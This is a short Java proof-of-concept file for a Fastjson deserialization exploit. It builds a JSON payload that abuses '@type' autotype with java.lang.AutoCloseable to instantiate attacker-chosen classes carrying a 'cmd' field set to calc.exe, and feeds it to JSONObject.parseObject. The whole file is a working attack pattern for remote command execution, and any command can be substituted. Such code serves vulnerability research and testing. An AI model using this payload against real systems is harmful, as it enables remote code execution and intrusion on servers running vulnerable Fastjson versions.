package org.heptagram.fastjson;

import com.alibaba.fastjson.JSONObject;

public class ExecReadableMain {
    public static void main(String[] args) {
        String payload ="{\n" +
                "  \"@type\":\"java.lang.AutoCloseable\",\n" +
                "  \"@type\": \"org.heptagram.fastjson.ExecReadable\",\n" +
                "  \"eval\":{\"@type\":\"org.heptagram.fastjson.EvalReadable\",\"cmd\":\"calc.exe\"}\n" +
                "}";
        JSONObject.parseObject(payload);
    }
}
